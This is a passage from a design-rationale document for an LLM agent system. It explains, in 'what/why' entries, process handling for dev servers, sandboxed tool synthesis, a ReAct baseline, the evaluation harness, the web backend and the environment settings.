**Why:** LangGraph nodes are stateless functions. The `Popen` handle for a running dev server must survive between node calls — if it's garbage collected, the server process becomes an orphan. A module-level dict is the simplest way to keep process handles alive across multiple node invocations within the same OS process.

#### `DEFAULT_READY_TIMEOUT_SECONDS = 15`, `READY_POLL_INTERVAL_SECONDS = 0.2`

**What:** Iterative socket polling to detect when the dev server is ready.

**Why:** A fixed `time.sleep(5)` is wasteful (the server might be ready in 1 second) and unreliable (a heavy server might need 10 seconds). Polling every 200ms with a 15-second timeout means:
- Fast servers are detected almost immediately (200ms after they start listening)
- Slow servers get a full 15 seconds to start
- The agent knows the exact moment the server is ready, not a best-guess estimate

#### `start_new_session=True` + `os.killpg()` — Process Group Management

**What:** Dev servers are started in their own process group, and killed via `os.killpg()`.

**Why:** Dev servers like Vite spawn child worker processes (HMR watchers, file watchers). If you only kill the parent process, the children become orphans that hold the port open — the next `start_server` attempt fails because the port is still in use. Killing the entire process group ensures the complete process tree is terminated.

#### `stdin=subprocess.DEVNULL` for Dev Servers

**What:** Dev servers receive EOF immediately on stdin.

**Why:** Same principle as shell commands. Vite specifically will stall with "Port 3000 is in use, try another? (y/n)" if it sees a live TTY. With DEVNULL, it hits EOF and crashes immediately with a clear error message instead of hanging until the 15-second timeout.

#### Dual IPv4/IPv6 Probing (127.0.0.1 and ::1)

**What:** The readiness check probes both `127.0.0.1` (IPv4) and `::1` (IPv6).

**Why:** Depending on Node.js version and OS configuration, some dev servers bind only to IPv6 loopback. If the probe only checked IPv4, a perfectly healthy IPv6-only server would fail the readiness check, causing a false timeout.

---

## 6. Dynamic Tool Synthesis

### 6.1 Code Generation (`codegen.py`)

#### Two-Step Generation: Schema First, Then Code

**What:**
1. `declare_schema` generates the I/O contract (input/output types, description)
2. `generate_function_code` generates Python code adhering to the schema

**Why:** If you ask an LLM to "write a function that converts Fahrenheit to Celsius," it often generates something with a random function signature, inconsistent input/output formats, and no clear contract. By generating the schema first, you force the LLM to think about WHAT the tool does before HOW — and the resulting code must conform to the declared interface, enabling reliable reuse.

#### Pure Computation Constraints (No Network, No File I/O, No `input()`)

**What:** Synthesized tools are prohibited from making network calls, file I/O, or user input.

**Why:** Synthesized tools are cached and reused across multiple steps. A tool that makes network calls would be non-deterministic (different results each time). File I/O would create ordering dependencies. `input()` would stall the agent. By constraining tools to pure computation, they're safe to call in any order, any number of times, with guaranteed deterministic results.

---

### 6.2 Schema & Validation (`schema.py`, `validator.py`)

#### `capability_name` Must Be `snake_case`

**What:** The registry key for synthesized tools is forced to be a snake_case identifier.

**Why:** This is the programmatic key used to look up and reuse tools. If the LLM generates `"Convert Fahrenheit to Celsius!"` as the name, the lookup/matching logic breaks. Snake_case ensures consistent, code-friendly identifiers.

#### `_basic_shape_check` — Only Checks for Non-Empty Dict

**What:** Validation only checks that the output is a non-empty Python dict.

**Why:** The schema is defined via English text (`output_description`), not a strict Pydantic model. Deep structural checking is impossible because there's no machine-readable spec to validate against. But checking for a dict catches the two most common LLM failures:
1. Script crashes before printing output → empty stdout → caught
2. Script prints conversational prose instead of JSON → not a dict → caught

---

### 6.3 Synthesis Registry (`registry.py`)

#### Singleton Pattern (`default_registry`)

**What:** A single global `SynthesisRegistry` instance shared across all nodes.

**Why:** When a tool is synthesized in step 3 and reused in step 7, both steps need to reference the same registry. A singleton ensures cross-node visibility without threading the registry through LangGraph state (which would require serializing executable code — a security nightmare).

---

## 7. ReAct Agent

The ReAct agent is a simpler alternative to Plan-Execute, kept for comparison and evaluation.

| Decision | Why |
|---|---|
| `MAX_REACT_ITERATIONS = 15` | Matches `MAX_TOTAL_STEPS` in Plan-Execute for fair comparison in ablation studies. |
| `InMemorySaver` checkpointer | ReAct has no HITL gates — it runs straight through without pausing for approval. No need for durable SQLite persistence. |
| `MAX_HISTORY_TURNS_IN_PROMPT = 6`, `MAX_HISTORY_CHARS_IN_PROMPT = 9_000` | Prevents context window explosion. History is added newest-first, so the agent always sees its most recent actions even when old context is truncated. |
| `MAX_TURN_FIELD_CHARS = 1_500` | Individual turn fields (thought, action, observation) are truncated to prevent a single verbose observation from dominating the entire history window. |
| `REPEAT_WARNING_THRESHOLD = 3` | If the model tries the exact same action/input 3 times, a literal warning string is injected into the prompt. ReAct has no replanner — this is the only mechanism to break out of loops. |
| `_trim_trailing_rambling` | LLMs keep "thinking out loud" after stating an action, adding text that breaks JSON/shell parsing. This strips everything after the action block. |
| `_strip_wrapping_quotes` | Outer quotes around `action_input` break `shlex.split()` — it treats `"bash -c '...'"` as a single argument instead of tokenizing it. |
| Last valid Action block is used | LLMs sometimes output placeholder actions mid-thought or narrate future steps. Taking the last valid block gets the actual intended action. |

---

## 8. Eval Framework

#### `golden_dataset.py` — Anchored, Not Temporal

**What:** Test goals use anchored concepts ("2024 Formula 1 championship") instead of temporal ones ("yesterday's match").

**Why:** Temporal goals produce different correct answers depending on when the eval runs. Anchored goals have fixed correct answers, making automated evaluation reliable and reproducible.

#### `judge.py` — `_exact_match_check` for Deterministic Goals

**What:** Some goals (SHA-256 hashes, UUID validation) use exact string matching alongside the LLM judge.

**Why:** LLMs are notoriously bad at exact string comparison. An LLM judge might score a hash as "correct" even if one character is different. The hardcoded string match runs alongside the LLM and catches judge errors for goals where exactness matters.

#### `arm_runner.py` — `max_wall_clock_seconds = 300`

**What:** 5-minute hard timeout per eval run.

**Why:** If an eval run hangs (waiting for an unexpected interrupt, stuck in an infinite generation loop), this kills it without crashing the entire batch process. Without this, one stuck run blocks 15+ subsequent runs.

#### `arm_runner.py` — Auto-Approve All Steps

**What:** The eval runner automatically approves all HITL interrupts.

**Why:** The golden dataset is specifically designed to contain NO side-effecting goals (no purchases, no emails, no external writes). Since all goals are read-only/computational, auto-approval is safe and enables fully automated batch evaluation.

#### `run_ablation.py` — "Coverage Gain from Synthesis" Metric

**What:** Measures how many Category D (synthesis-required) goals pass with synthesis enabled vs disabled.

**Why:** This is the cleanest numeric indicator of whether the dynamic tool synthesis feature actually provides value. If the metric is 0, synthesis is adding complexity without benefit. If it's >0, there are concrete goals that only work because of synthesis.

---

## 10. API & Visualization

### 10.1 FastAPI Backend (`main.py`)

#### WebSocket Streaming Architecture

**What:** Real-time event streaming via WebSocket connections for live agent execution updates.

**Why:** The web interface needs to show agent execution progress in real-time. Traditional polling would be inefficient and provide poor user experience. WebSocket connections allow the backend to push events instantly as they occur, providing smooth live updates without the overhead of repeated HTTP requests.

#### Single Active Chat Session Guard

**What:** A global guard (`_active_chat_run`) that ensures only one chat session can be active at a time.

**Why:** Multiple concurrent chat sessions could lead to race conditions, confused state management, and poor user experience. The guard prevents session conflicts by rejecting new chat requests while an existing session is active, while still allowing debugger mode access to historical runs.

#### Interrupt Queue Management

**What:** Per-run interrupt queues (`get_interrupt_queues()`) that store human responses to approval gates.

**Why:** When the agent hits a HIGH-risk tool and pauses for human approval, the response needs to be delivered to the waiting graph execution. Interrupt queues provide a thread-safe mechanism to bridge the web interface's async response handling with LangGraph's synchronous interrupt mechanism.

### 10.2 Event Bus System (`event_bus.py`)

#### Publisher-Subscriber Pattern

**What:** A centralized event bus that implements publish-subscribe messaging for agent events.

**Why:** Multiple components (WebSocket streams, UI updates, logging) need to react to the same agent events. A centralized event bus decouples these components, allowing new subscribers to be added without modifying existing code. This is particularly important for the dual-mode interface where both chat and debugger views need to consume the same event stream.

### 10.3 Run Store (`store.py`)

#### SQLite Persistence

**What:** Uses SQLite for persistent storage of runs, steps, and chat messages.

**Why:** SQLite provides a lightweight, serverless database that requires no additional infrastructure setup. It's perfect for this use case because it's embedded (no separate database process), supports concurrent access, and provides ACID guarantees for data integrity. The database file can be easily backed up or migrated as needed.

### 10.4 Web Interface Components

#### Chat Interface with Streaming

**What:** React-based chat interface with real-time message streaming and interrupt handling.

**Why:** Users expect a conversational interface similar to ChatGPT. The chat interface provides an intuitive way to interact with the agent, showing both user messages and agent responses in a familiar format. Streaming responses provide immediate feedback and reduce perceived latency.

#### Debugger Mode with Timeline

**What:** Three-panel debugger layout with run list, timeline view, and context panel.

**Why:** For debugging and analysis, users need to inspect the execution flow in detail. The timeline view shows all steps chronologically, the context panel provides detailed information about each step, and the playback scrubber allows stepping through execution. This is essential for understanding agent behavior and troubleshooting issues.

#### Activity Indicators and Toast Notifications

**What:** Visual feedback components showing agent state (thinking, executing, waiting) and important events.

**Why:** Agent execution can take time, and users need to know what's happening. Activity indicators reduce uncertainty by showing the current state, while toast notifications alert users to important events like completion, errors, or required approvals.

---

## 11. Environment Configuration

#### `.env.example` — All Configuration Parameters

| Parameter | Value | Why |
|---|---|---|
| `SANDBOX_TIMEOUT_SECONDS` | `15` | Kills runaway code. 15s is generous for computation but catches infinite loops quickly. |
| `SANDBOX_MAX_MEMORY_MB` | `256` | Prevents OOM bombs. Enough for data processing, too small for malicious allocations. |
| `OUTBOUND_DOMAIN_ALLOWLIST` | `api.tavily.com` | Only Tavily's API is accessible from sandboxed code. Prevents data exfiltration and arbitrary package downloads. |
| `LLM_PROVIDER` | `openrouter` | Default to free-tier OpenRouter. Alternatives: `groq`, `ollama`, `anthropic`. |
| `OPENROUTER_MODEL` | `nvidia/nemotron-3-ultra-550b-a55b:free` | Free tier, large context window, good reasoning for planning. |
| `BROWSER_USE_MODEL` | `google/gemma-4-26b-a4b-it:free` | Free tier, supports structured JSON output (critical for browser-use). |
| `BROWSER_USE_MAX_STEPS` | `25` | Per-task browser step limit. |
| `BROWSER_USE_MAX_FAILURES` | `3` | Consecutive failure limit before aborting browser task. |
| `LANGCHAIN_TRACING_V2` | `true` | Enable LangSmith tracing for debugging graph execution. |

**Additional Configuration Options:**
- `GROQ_MODEL=openai/gpt-oss-120b` - Alternative Groq model for fast inference
- `OLLAMA_MODEL=gemma4:latest` - Local Ollama model for offline development  
- `CLAUDE_MODEL=claude-sonnet-4.6` - Anthropic Claude model for high-quality reasoning
- `BROWSER_USE_MODEL=google/gemma-4-31b-it:free` - Updated from 26b to 31b for better browser automation performance

#### `.gitignore` — Notable Exclusions

| Pattern | Why |
|---|---|
| `checkpoints.db-wal`, `checkpoints.db-shm` | SQLite Write-Ahead Log files. Committing them corrupts checkpoint state across machines. |
| `agent_outputs/*/workspace/` | Transient generated code. Large, reproducible, not source. |
| `sandbox_runs/` | Temporary sandbox execution directories. |
| `.env` | Contains API keys. Never committed. |
